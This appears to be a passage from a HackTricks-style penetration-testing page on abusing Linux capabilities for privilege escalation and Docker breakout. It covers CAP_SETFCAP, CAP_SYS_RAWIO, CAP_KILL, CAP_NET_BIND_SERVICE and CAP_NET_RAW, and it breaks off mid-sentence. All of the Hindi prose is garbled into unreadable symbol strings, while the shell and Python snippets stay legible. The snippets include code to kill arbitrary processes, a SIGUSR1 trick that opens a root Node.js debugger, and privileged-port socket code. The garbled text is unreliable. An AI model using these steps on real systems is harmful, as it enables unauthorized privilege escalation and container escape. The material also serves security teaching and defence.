‡§ú‡§¨ ‡§Ü‡§™‡§ï‡•á ‡§™‡§æ‡§∏ [SETUID ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ](linux-capabilities.md#cap\_setuid) ‡§π‡•ã‡§§‡•Ä ‡§π‡•à, ‡§§‡•ã ‡§Ü‡§™ ‡§Ö‡§ß‡§ø‡§ï‡§æ‡§∞‡•ã‡§Ç ‡§ï‡•ã ‡§¨‡§¢‡§º‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§á‡§∏‡§ï‡•á ‡§ñ‡§Ç‡§° ‡§Æ‡•á‡§Ç ‡§ú‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

**‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§µ‡§æ‡§§‡§æ‡§µ‡§∞‡§£ ‡§ï‡•á ‡§∏‡§æ‡§• (Docker breakout)**

‡§°‡•â‡§ï‡§∞ ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§ï‡•á ‡§™‡•ç‡§∞‡•ã‡§∏‡•á‡§∏ ‡§ï‡•ã ‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ **CAP\_SETFCAP ‡§¶‡•Ä ‡§ú‡§æ‡§§‡•Ä ‡§π‡•à**‡•§ ‡§Ü‡§™ ‡§ê‡§∏‡§æ ‡§ï‡•Å‡§õ ‡§ï‡§∞‡§ï‡•á ‡§ú‡§æ‡§Ç‡§ö ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
‡§Ø‡§π ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•ã **‡§ï‡§ø‡§∏‡•Ä ‡§Ö‡§®‡•ç‡§Ø ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§ï‡•ã ‡§¶‡•á‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡•Ä ‡§π‡•à**, ‡§á‡§∏‡§≤‡§ø‡§è ‡§π‡§Æ **‡§á‡§∏ ‡§™‡•á‡§ú ‡§Æ‡•á‡§Ç ‡§â‡§≤‡•ç‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§Ö‡§®‡•ç‡§Ø ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§¨‡•ç‡§∞‡•á‡§ï‡§Ü‡§â‡§ü ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§∏‡•á ‡§¨‡§æ‡§π‡§∞ ‡§®‡§ø‡§ï‡§≤‡§®‡•á** ‡§ï‡•á ‡§¨‡§æ‡§∞‡•á ‡§Æ‡•á‡§Ç ‡§∏‡•ã‡§ö ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§\
‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§Ø‡§¶‡§ø ‡§Ü‡§™ gdb ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•ã CAP\_SYS\_ADMIN ‡§î‡§∞ CAP\_SYS\_PTRACE ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§¶‡•á‡§®‡•á ‡§ï‡§æ ‡§™‡•ç‡§∞‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç, ‡§§‡•ã ‡§Ü‡§™ ‡§¶‡•á‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§π‡•ã‡§Ç‡§ó‡•á, ‡§≤‡•á‡§ï‡§ø‡§® ‡§á‡§∏‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä **‡§µ‡§æ‡§∏‡•ç‡§§‡§µ‡§ø‡§ï‡§§‡§æ ‡§Æ‡•á‡§Ç ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§æ‡§®‡•ç‡§µ‡§ø‡§§ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§ó‡§æ**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§Æ‡•à‡§Ç‡§®‡•á ‡§Ø‡§π ‡§™‡§¢‡§º‡§æ ‡§π‡•à: _Permitted: ‡§Ø‡§π ‡§è‡§ï **‡§™‡•ç‡§∞‡§≠‡§æ‡§µ‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡•Ä‡§Æ‡§ø‡§§ ‡§∏‡•Å‡§™‡§∞‡§∏‡•á‡§ü ‡§π‡•à** ‡§ú‡§ø‡§®‡•ç‡§π‡•á‡§Ç ‡§•‡•ç‡§∞‡•á‡§° ‡§Ö‡§∏‡•ç‡§Æ‡§ø‡§§‡§æ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§ ‡§Ø‡§π ‡§è‡§ï ‡§ê‡§∏‡•Ä ‡§∏‡•Ä‡§Æ‡§ø‡§§ ‡§∏‡•Å‡§™‡§∞‡§∏‡•á‡§ü ‡§≠‡•Ä ‡§π‡•à ‡§ú‡§ø‡§∏‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§•‡•ç‡§∞‡•á‡§° ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§µ‡§æ‡§∞‡•ç‡§§‡§æ‡§≤‡§æ‡§™‡§ø‡§§ ‡§∏‡•á‡§ü ‡§Æ‡•á‡§Ç **CAP\_SETPCAP** ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§§‡•Ä ‡§π‡•à‡•§_\
‡§ê‡§∏‡§æ ‡§≤‡§ó‡§§‡§æ ‡§π‡•à ‡§ï‡§ø Permitted ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç ‡§â‡§®‡•ç‡§π‡•á‡§Ç ‡§∏‡•Ä‡§Æ‡§ø‡§§ ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à‡§Ç ‡§ú‡•ã ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§è ‡§ú‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§\
‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§°‡•â‡§ï‡§∞ ‡§≠‡•Ä ‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§∞‡•Ç‡§™ ‡§∏‡•á **CAP\_SETPCAP** ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§á‡§∏‡§≤‡§ø‡§è ‡§Ü‡§™ **‡§µ‡§ø‡§∞‡§æ‡§∏‡§§ ‡§Æ‡•á‡§Ç ‡§®‡§à ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç ‡§∏‡•á‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**‡•§\
‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§á‡§∏ ‡§ï‡•à‡§™ ‡§ï‡•Ä ‡§¶‡§∏‡•ç‡§§‡§æ‡§µ‡•á‡§ú‡§º‡•Ä‡§ï‡§∞‡§£ ‡§Æ‡•á‡§Ç ‡§Ø‡§π ‡§≤‡§ø‡§ñ‡§æ ‡§π‡•à: _CAP\_SETPCAP: \[...\] **‡§µ‡§æ‡§∞‡•ç‡§§‡§æ‡§≤‡§æ‡§™ ‡§ï‡§∞‡§®‡•á ‡§µ‡§æ‡§≤‡•á ‡§•‡•ç‡§∞‡•á‡§° ‡§ï‡•á ‡§¨‡§æ‡§â‡§Ç‡§°‡§ø‡§Ç‡§ó ‡§∏‡•á‡§ü ‡§∏‡•á ‡§ï‡•ã‡§à ‡§≠‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§â‡§∏‡§ï‡•Ä ‡§µ‡§ø‡§∞‡§æ‡§∏‡§§ ‡§Æ‡•á‡§Ç ‡§ú‡•ã‡§°‡§º ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à**_‡•§\
‡§ê‡§∏‡§æ ‡§≤‡§ó‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§π‡§Æ ‡§ï‡•á‡§µ‡§≤ ‡§µ‡§ø‡§∞‡§æ‡§∏‡§§ ‡§Æ‡•á‡§Ç ‡§¨‡§æ‡§â‡§Ç‡§°‡§ø‡§Ç‡§ó ‡§∏‡•á‡§ü ‡§∏‡•á ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§ú‡•ã‡§°‡§º ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§ú‡§ø‡§∏‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à ‡§ï‡§ø **‡§π‡§Æ ‡§µ‡§ø‡§∞‡§æ‡§∏‡§§ ‡§Æ‡•á‡§Ç ‡§®‡§à ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç ‡§ú‡•à‡§∏‡•á CAP\_SYS\_ADMIN ‡§Ø‡§æ CAP\_SYS\_PTRACE ‡§ï‡•ã ‡§®‡§π‡•Ä‡§Ç ‡§∞‡§ñ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§§‡§æ‡§ï‡§ø ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§¨‡§¢‡§º‡§æ‡§è‡§Ç**‡•§

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `/dev/mem`, `/dev/kmem` ‡§Ø‡§æ `/proc/kcore` ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö, `mmap_min_addr` ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡•á‡§Ç, `ioperm(2)` ‡§î‡§∞ `iopl(2)` ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§ï‡•â‡§≤ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡•á‡§Ç, ‡§î‡§∞ ‡§µ‡§ø‡§≠‡§ø‡§®‡•ç‡§® ‡§°‡§ø‡§∏‡•ç‡§ï ‡§ï‡§Æ‡§æ‡§Ç‡§°‡•§ ‡§á‡§∏ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á `FIBMAP ioctl(2)` ‡§≠‡•Ä ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§π‡•ã‡§§‡§æ ‡§π‡•à, ‡§ú‡§ø‡§∏‡§®‡•á [‡§™‡§ø‡§õ‡§≤‡•á](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) ‡§Æ‡•á‡§Ç ‡§∏‡§Æ‡§∏‡•ç‡§Ø‡§æ‡§è‡§Ç ‡§™‡•à‡§¶‡§æ ‡§ï‡•Ä ‡§π‡•à‡§Ç‡•§ ‡§Æ‡•à‡§® ‡§™‡•á‡§ú ‡§ï‡•á ‡§Ö‡§®‡•Å‡§∏‡§æ‡§∞, ‡§á‡§∏‡§ï‡•á ‡§ß‡§æ‡§∞‡§ï ‡§ï‡•ã ‡§Ö‡§®‡•ç‡§Ø ‡§â‡§™‡§ï‡§∞‡§£‡•ã‡§Ç ‡§™‡§∞ ‡§µ‡§ø‡§∂‡•á‡§∑ ‡§∞‡•Ç‡§™ ‡§∏‡•á `‡§µ‡§ø‡§≠‡§ø‡§®‡•ç‡§® ‡§â‡§™‡§ï‡§∞‡§£-‡§µ‡§ø‡§∂‡§ø‡§∑‡•ç‡§ü ‡§Ü‡§™‡§∞‡•á‡§∂‡§® ‡§ï‡§∞‡§®‡•á` ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§≠‡•Ä ‡§π‡•ã‡§§‡•Ä ‡§π‡•à‡•§

‡§Ø‡§π **‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§¨‡§¢‡§º‡§æ‡§®‡•á** ‡§î‡§∞ **Docker ‡§¨‡•ç‡§∞‡•á‡§ï‡§Ü‡§â‡§ü** ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•ã‡§ó‡•Ä ‡§π‡•ã ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

## CAP\_KILL

**‡§á‡§∏‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à ‡§ï‡§ø ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ã ‡§Æ‡§æ‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à‡•§**

**‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•á ‡§∏‡§æ‡§• ‡§â‡§¶‡§æ‡§π‡§∞‡§£**

‡§ö‡§≤‡•ã ‡§Æ‡§æ‡§® ‡§≤‡•á‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø **`python`** ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§Æ‡•á‡§Ç ‡§Ø‡§π ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§π‡•à‡•§ ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§ï‡§ø‡§∏‡•Ä ‡§∏‡•á‡§µ‡§æ ‡§Ø‡§æ ‡§∏‡•â‡§ï‡•á‡§ü ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞‡•á‡§∂‡§® (‡§Ø‡§æ ‡§ï‡§ø‡§∏‡•Ä ‡§∏‡•á‡§µ‡§æ ‡§∏‡•á ‡§∏‡§Ç‡§¨‡§Ç‡§ß‡§ø‡§§ ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞‡•á‡§∂‡§® ‡§´‡§º‡§æ‡§á‡§≤) ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•ã **‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**, ‡§§‡•ã ‡§Ü‡§™ ‡§â‡§∏‡•á ‡§¨‡•à‡§ï‡§°‡•ã‡§∞ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§î‡§∞ ‡§´‡§ø‡§∞ ‡§â‡§∏ ‡§∏‡•á‡§µ‡§æ ‡§∏‡•á ‡§∏‡§Ç‡§¨‡§Ç‡§ß‡§ø‡§§ ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ã ‡§Æ‡§æ‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§Ü‡§™‡§ï‡•á ‡§¨‡•à‡§ï‡§°‡•ã‡§∞ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§®‡§à ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞‡•á‡§∂‡§® ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•ã ‡§®‡§Ø‡§æ ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§π‡•ã‡§®‡•á ‡§ï‡§æ ‡§á‡§Ç‡§§‡§ú‡§º‡§æ‡§∞ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**kill** ‡§ï‡•á ‡§∏‡§æ‡§• Privesc

‡§Ø‡§¶‡§ø ‡§Ü‡§™‡§ï‡•á ‡§™‡§æ‡§∏ kill ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§è‡§ï **‡§∞‡•Ç‡§ü ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§ö‡§≤ ‡§∞‡§π‡§æ ‡§π‡•à** (‡§Ø‡§æ ‡§è‡§ï ‡§Ö‡§≤‡§ó ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç) **‡§®‡•ã‡§° ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ** ‡§π‡•à, ‡§§‡•ã ‡§Ü‡§™ ‡§∂‡§æ‡§Ø‡§¶ ‡§á‡§∏‡•á **‡§∏‡§ø‡§ó‡•ç‡§®‡§≤ SIGUSR1** ‡§≠‡•á‡§ú‡§ï‡§∞ ‡§á‡§∏‡•á **‡§®‡•ã‡§° ‡§°‡•Ä‡§¨‡§ó‡§∞ ‡§ñ‡•ã‡§≤‡§®‡•á** ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Æ‡§ú‡§¨‡•Ç‡§∞ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§ú‡§π‡§æ‡§Ç ‡§Ü‡§™ ‡§ï‡§®‡•á‡§ï‡•ç‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

‚Äã

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) ‡§∏‡•ç‡§™‡•á‡§® ‡§Æ‡•á‡§Ç ‡§∏‡§¨‡§∏‡•á ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§∏‡§æ‡§á‡§¨‡§∞ ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡•ç‡§∞‡§Æ ‡§π‡•à ‡§î‡§∞ ‡§Ø‡•Ç‡§∞‡•ã‡§™ ‡§Æ‡•á‡§Ç ‡§∏‡§¨‡§∏‡•á ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§Æ‡•á‡§Ç ‡§∏‡•á ‡§è‡§ï ‡§π‡•à‡•§ **‡§§‡§ï‡§®‡•Ä‡§ï‡•Ä ‡§ú‡•ç‡§û‡§æ‡§® ‡§ï‡•ã ‡§¨‡§¢‡§º‡§æ‡§µ‡§æ ‡§¶‡•á‡§®‡•á ‡§ï‡•Ä ‡§Æ‡§ø‡§∂‡§® ‡§ï‡•á ‡§∏‡§æ‡§•**, ‡§Ø‡§π ‡§ï‡§æ‡§Ç‡§ó‡•ç‡§∞‡•á‡§∏ ‡§™‡•ç‡§∞‡•å‡§¶‡•ç‡§Ø‡•ã‡§ó‡§ø‡§ï‡•Ä ‡§î‡§∞ ‡§∏‡§æ‡§á‡§¨‡§∞ ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§µ‡§ø‡§∂‡•á‡§∑‡§ú‡•ç‡§û‡•ã‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§â‡§¨‡§≤‡§§‡§æ ‡§π‡•Å‡§Ü ‡§Æ‡§ø‡§≤‡§® ‡§∏‡•ç‡§•‡§≤ ‡§π‡•à‡•§

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**‡§á‡§∏‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à ‡§ï‡§ø ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§™‡•ã‡§∞‡•ç‡§ü ‡§™‡§∞ ‡§∏‡•Å‡§®‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à (‡§Ø‡§π‡§æ‡§Ç ‡§§‡§ï ‡§ï‡§ø ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡•É‡§§ ‡§™‡•ã‡§∞‡•ç‡§ü ‡§™‡§∞ ‡§≠‡•Ä)‡•§** ‡§Ü‡§™ ‡§á‡§∏ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§∏‡•Ä‡§ß‡•á ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞‡•ã‡§Ç ‡§ï‡•ã ‡§¨‡§¢‡§º‡§æ ‡§®‡§π‡•Ä‡§Ç ‡§∏‡§ï‡§§‡•á‡•§

**‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•á ‡§∏‡§æ‡§• ‡§â‡§¶‡§æ‡§π‡§∞‡§£**

‡§Ø‡§¶‡§ø **`python`** ‡§ï‡•á ‡§™‡§æ‡§∏ ‡§á‡§∏ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§π‡•à ‡§§‡•ã ‡§Ø‡§π ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§™‡•ã‡§∞‡•ç‡§ü ‡§™‡§∞ ‡§∏‡•Å‡§® ‡§∏‡§ï‡•á‡§ó‡§æ ‡§î‡§∞ ‡§á‡§∏‡§∏‡•á ‡§ï‡§ø‡§∏‡•Ä ‡§Ö‡§®‡•ç‡§Ø ‡§™‡•ã‡§∞‡•ç‡§ü ‡§™‡§∞ ‡§≠‡•Ä ‡§ï‡§®‡•á‡§ï‡•ç‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡•á‡§ó‡§æ (‡§ï‡•Å‡§õ ‡§∏‡•á‡§µ‡§æ‡§è‡§Ç ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞‡•ã‡§Ç ‡§µ‡§æ‡§≤‡•á ‡§™‡•ã‡§∞‡•ç‡§ü ‡§∏‡•á ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à)‡•§

{% tabs %}
{% tab title="‡§∏‡•Å‡§®‡•á‡§Ç" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="‡§∏‡§Ç‡§™‡§∞‡•ç‡§ï ‡§ï‡§∞‡•á‡§Ç" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ‡§è‡§ï ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ã ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§µ‡§π ‡§â‡§™‡§≤‡§¨‡•ç‡§ß ‡§®‡•á‡§ü‡§µ‡§∞‡•ç‡§ï ‡§®‡•á‡§Æ‡§∏‡•ç‡§™‡•á‡§∏ ‡§ï‡•á ‡§≤‡§ø‡§è **RAW ‡§î‡§∞ PACKET ‡§∏‡•â‡§ï‡•á‡§ü ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞** ‡§¨‡§®‡§æ ‡§∏‡§ï‡•á‡•§ ‡§á‡§∏‡§∏‡•á ‡§â‡§™‡§Ø‡•Å‡§ï‡•ç‡§§ ‡§°‡•á‡§ü‡§æ ‡§™‡•à‡§ï‡•á‡§ü ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§î‡§∞ ‡§™‡•ç‡§∞‡•á‡§∑‡§ø‡§§ ‡§ï‡§ø‡§è ‡§ú‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§¨‡§π‡•Å‡§§ ‡§∏‡§æ‡§∞‡•á ‡§Æ‡§æ‡§Æ‡§≤‡•ã‡§Ç ‡§Æ‡•á‡§Ç, ‡§Ø‡§π ‡§á‡§Ç‡§ü‡§∞‡§´‡•á‡§∏ ‡§è‡§ï ‡§µ‡§∞‡•ç‡§ö‡•Å‡§Ö‡§≤ ‡§à‡§•‡§∞‡§®‡•á‡§ü ‡§°‡§ø‡§µ‡§æ‡§á‡§∏ ‡§π‡•ã‡§ó‡§æ ‡§ú‡§ø‡§∏‡§∏‡•á ‡§è‡§ï ‡§ñ‡§§‡§∞‡§®‡§æ‡§ï ‡§Ø‡§æ **‡§∏‡§Ç‡§ï‡§ü‡§Æ‡§Ø ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞** ‡§µ‡§ø‡§≠‡§ø‡§®‡•ç‡§® ‡§®‡•á‡§ü‡§µ‡§∞‡•ç‡§ï ‡§™‡§∞‡§§‡•ã‡§Ç ‡§Æ‡•á‡§Ç **‡§™‡•à‡§ï‡•á‡§ü‡•ç‡§∏ ‡§ï‡•ã ‡§õ‡§≤‡§ï‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à**‡•§ ‡§á‡§∏ ‡§Ø‡•ã‡§ó‡•ç‡§Ø‡§§‡§æ ‡§µ‡§æ‡§≤‡•Ä ‡§è‡§ï ‡§ñ‡§§‡§∞‡§®‡§æ‡§ï ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§Ø‡§æ ‡§∏‡§Ç‡§ï‡§ü‡§Æ‡§Ø ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§â‡§™‡§∏‡•ç‡§•‡§ø‡§§ ‡§¨‡•ç‡§∞‡§ø‡§ú ‡§Æ‡•á‡§Ç ‡§á‡§Ç‡§ú‡•á‡§ï‡•ç‡§∂‡§® ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à, ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞‡•ã‡§Ç ‡§ï‡•á ‡§¨‡•Ä‡§ö ‡§Æ‡§æ‡§∞‡•ç‡§ó‡§®‡§ø‡§∞‡•ç‡§ß‡§æ‡§∞‡§£ ‡§ï‡§æ ‡§∂‡•ã‡§∑‡§£ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à, ‡§®‡•á‡§ü‡§µ‡§∞‡•ç‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§£‡•ã‡§Ç ‡§ï‡•ã ‡§õ‡§≤‡§®‡•á ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à, ‡§î‡§∞ ‡§Ö‡§®‡•ç‡§Ø‡§•‡§æ ‡§π‡•ã‡§∏‡•ç‡§ü 